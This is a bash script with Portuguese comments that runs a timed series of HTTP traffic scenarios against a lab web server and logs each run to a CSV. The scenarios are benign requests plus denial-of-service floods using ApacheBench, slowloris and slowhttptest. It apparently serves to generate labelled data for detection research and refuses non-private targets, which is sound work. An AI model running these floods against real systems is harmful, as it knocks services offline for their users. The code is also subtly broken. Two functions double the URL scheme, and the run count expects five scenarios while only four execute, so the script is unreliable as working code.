#!/usr/bin/env bash
set -u

# Uso:
#   ./dos_lab_runner_simples.sh http://192.168.100.10 120 60
#
# Argumentos:
#   1: URL alvo
#   2: duração de cada cenário em segundos
#   3: pausa entre cenários em segundos

TARGET_URL="${1:-http://192.168.100.10}"
DURATION="${2:-120}"
PAUSE="${3:-60}"

SLOWLORIS_PATH="/home/kali/Documents/slowloris/slowloris.py"
PYTHON_CMD=""

RUN_ID="$(date +%Y%m%d_%H%M%S)"
OUT_DIR="dos_lab_run_${RUN_ID}"
LOG_FILE="${OUT_DIR}/run_log.csv"

RUN_INDEX=0
TOTAL_RUNS=5

mkdir -p "$OUT_DIR"

echo "scenario,expected_class,start_time,end_time,command" > "$LOG_FILE"

check_tool() {
    local cmd="$1"
    local required="$2"

    if command -v "$cmd" >/dev/null 2>&1; then
        echo "[OK]    $cmd encontrado em: $(command -v "$cmd")"
        return 0
    else
        if [[ "$required" == "required" ]]; then
            echo "[ERRO]  $cmd não encontrado. Esta ferramenta é obrigatória."
            return 1
        else
            echo "[AVISO] $cmd não encontrado. O script tentará usar alternativa, se existir."
            return 0
        fi
    fi
}

check_dependencies() {
    echo
    echo "============================================================"
    echo "Verificando ferramentas necessárias"
    echo "============================================================"

    local missing_required=0

    check_tool curl required || missing_required=1
    check_tool timeout required || missing_required=1
    check_tool shuf required || missing_required=1
    check_tool awk required || missing_required=1
    check_tool ab required || missing_required=1
    check_tool slowhttptest required || missing_required=1
    check_tool goldeneye optional

    if command -v python3 >/dev/null 2>&1; then
        PYTHON_CMD="python3"
        echo "[OK]    python3 encontrado em: $(command -v python3)"
    elif command -v python >/dev/null 2>&1; then
        PYTHON_CMD="python"
        echo "[OK]    python encontrado em: $(command -v python)"
    else
        echo "[ERRO]  Nenhum interpretador Python encontrado."
        missing_required=1
    fi

    if [[ -f "$SLOWLORIS_PATH" ]]; then
        echo "[OK]    slowloris.py encontrado em: $SLOWLORIS_PATH"
    else
        echo "[ERRO]  slowloris.py não encontrado em: $SLOWLORIS_PATH"
        missing_required=1
    fi

    echo "------------------------------------------------------------"

    if ! command -v goldeneye >/dev/null 2>&1; then
        echo "[AVISO] goldeneye não encontrado."
        echo "        O cenário C3 usará ApacheBench como alternativa."
    else
        echo "[OK]    goldeneye disponível para o cenário C3."
    fi

    echo "------------------------------------------------------------"

    if [[ "$missing_required" -eq 1 ]]; then
        echo "[FALHA] Existem dependências obrigatórias ausentes."
        echo
        echo "Instale as dependências principais com:"
        echo "sudo apt update"
        echo "sudo apt install -y curl coreutils apache2-utils slowhttptest python3"
        echo
        echo "Opcional para o cenário GoldenEye:"
        echo "sudo apt install -y goldeneye"
        exit 1
    fi

    echo "[OK] Todas as dependências obrigatórias estão disponíveis."
}

check_private_target() {
    local host
    host="$(echo "$TARGET_URL" | sed -E 's#^https?://##' | cut -d/ -f1 | cut -d: -f1)"

    if [[ "$host" != 192.168.* &&
          "$host" != 10.* &&
          "$host" != 172.16.* &&
          "$host" != 172.17.* &&
          "$host" != 172.18.* &&
          "$host" != 172.19.* &&
          "$host" != 172.20.* &&
          "$host" != 172.21.* &&
          "$host" != 172.22.* &&
          "$host" != 172.23.* &&
          "$host" != 172.24.* &&
          "$host" != 172.25.* &&
          "$host" != 172.26.* &&
          "$host" != 172.27.* &&
          "$host" != 172.28.* &&
          "$host" != 172.29.* &&
          "$host" != 172.30.* &&
          "$host" != 172.31.* &&
          "$host" != 127.* &&
          "$host" != "localhost" ]]; then
        echo "[ERRO] O alvo não parece ser um IP privado/local: $host"
        echo "       Use este script apenas no laboratório isolado das suas VMs."
        exit 1
    fi

    echo "[OK] Alvo em faixa privada/local: $host"
}

log_run() {
    local scenario="$1"
    local expected="$2"
    local start="$3"
    local end="$4"
    local command_desc="$5"

    printf '"%s","%s","%s","%s","%s"\n' \
        "$scenario" "$expected" "$start" "$end" "$command_desc" >> "$LOG_FILE"
}

run_action_timed() {
    local scenario="$1"
    local expected="$2"
    local command_desc="$3"
    local action="$4"

    RUN_INDEX=$((RUN_INDEX + 1))

    echo
    echo "============================================================"
    echo "Execução: $RUN_INDEX de $TOTAL_RUNS"
    echo "Cenário: $scenario"
    echo "Classe esperada: $expected"
    echo "Início: $(date -Is)"
    echo "Comando/descrição: $command_desc"
    echo "============================================================"

    local start_time
    local end_time

    start_time="$(date -Is)"
    "$action"
    end_time="$(date -Is)"

    log_run "$scenario" "$expected" "$start_time" "$end_time" "$command_desc"

    echo "Fim: $end_time"

    if [[ "$RUN_INDEX" -lt "$TOTAL_RUNS" ]]; then
        echo "Aguardando ${PAUSE}s antes do próximo cenário..."
        sleep "$PAUSE"
    fi
}

run_benign_http() {
    local end_time
    end_time=$((SECONDS + DURATION))

    while [[ "$SECONDS" -lt "$end_time" ]]; do
        local path
        local agent
        local accept
        local method
        local cache
        local sep
        local url
        local delay

        path="$(shuf -n1 -e \
            "/" \
            "/index.html" \
            "/?home=1" \
            "/?page=about" \
            "/?q=teste" \
            "/?cache=1" \
            "/?produto=1" \
            "/?categoria=rede")"

        agent="$(shuf -n1 -e \
            "Mozilla/5.0" \
            "curl/8.0" \
            "Wget/1.21" \
            "LabClient/1.0" \
            "AcademicTestClient/1.0")"

        accept="$(shuf -n1 -e \
            "text/html" \
            "application/json" \
            "*/*")"

        method="$(shuf -n1 -e "GET" "GET" "GET" "HEAD")"

        cache="$RANDOM"

        case "$path" in
            *\?*) sep="&" ;;
            *) sep="?" ;;
        esac

        url="${TARGET_URL}${path}${sep}r=${cache}"

        if [[ "$method" == "HEAD" ]]; then
            curl -s -I -A "${agent}-${RANDOM}" -H "Accept: ${accept}" "$url" > /dev/null
        else
            curl -s -A "${agent}-${RANDOM}" -H "Accept: ${accept}" "$url" > /dev/null
        fi

        delay="$(awk -v r="$RANDOM" 'BEGIN{srand(r); printf "%.2f", 0.5+rand()*2.5}')"
        sleep "$delay"
    done
}

run_hulk_like() {
    local end_time
    end_time=$((SECONDS + DURATION))

    while [[ "$SECONDS" -lt "$end_time" ]]; do
        ab -n 2000 -c 200 "http://${TARGET_URL}/" > /dev/null 2>&1 || true
    done
}

run_goldeneye_like() {
    if command -v goldeneye >/dev/null 2>&1; then
        timeout "$DURATION" goldeneye "${TARGET_URL}/" -w 10 -s 10 -m get || true
    else
        local end_time
        end_time=$((SECONDS + DURATION))

        while [[ "$SECONDS" -lt "$end_time" ]]; do
            ab -k -n 1500 -c 150 "${TARGET_URL}/?goldeneye=1" > /dev/null 2>&1 || true
        done
    fi
}

run_slowloris_attack() {
    timeout "$DURATION" "$PYTHON_CMD" "$SLOWLORIS_PATH" "$TARGET_URL" || true
}

run_slowbody_attack() {
    slowhttptest -B -c 200 -r 50 -t POST -u "http://${TARGET_URL}/" -x 10 -s 4096 -p 3 -l "$DURATION"
}

echo "============================================================"
echo "Script simples de geração de tráfego para laboratório DoS"
echo "============================================================"
echo "Alvo: $TARGET_URL"
echo "Duração por cenário: ${DURATION}s"
echo "Pausa entre cenários: ${PAUSE}s"
echo "Total de cenários: ${TOTAL_RUNS}"
echo "Diretório de saída: $OUT_DIR"
echo "============================================================"

check_private_target
check_dependencies

echo
echo "Antes de continuar, confirme que:"
echo "1) A ferramenta está rodando na VM vítima."
echo "2) A vítima está capturando a interface da rede interna."
echo "3) O serviço HTTP está acessível em: $TARGET_URL"
echo "4) O alvo é a sua VM de laboratório."
echo
read -r -p "Pressione ENTER para iniciar os cenários..."

run_action_timed \
    "C1 - Trafego benigno HTTP variado" \
    "BENIGN" \
    "curl com caminhos, métodos, cabeçalhos e intervalos variados" \
    run_benign_http

run_action_timed \
    "C2 - DoS Hulk-like HTTP flood" \
    "DoS Hulk" \
    "ApacheBench: ab -n 2000 -c 200 em repetição durante o cenário" \
    run_hulk_like


run_action_timed \
    "C4 - DoS slowloris" \
    "DoS slowloris" \
    "python slowloris.py URL, limitado pelo tempo do cenário" \
    run_slowloris_attack

run_action_timed \
    "C5 - DoS Slowhttptest slow body" \
    "DoS Slowhttptest" \
    "slowhttptest -B -c 200 -r 50 -t POST -x 10 -s 4096 -p 3" \
    run_slowbody_attack

echo
echo "============================================================"
echo "Todos os cenários foram finalizados."
echo "Log salvo em: $LOG_FILE"
echo "============================================================"
echo
echo "Resumo:"
cat "$LOG_FILE"
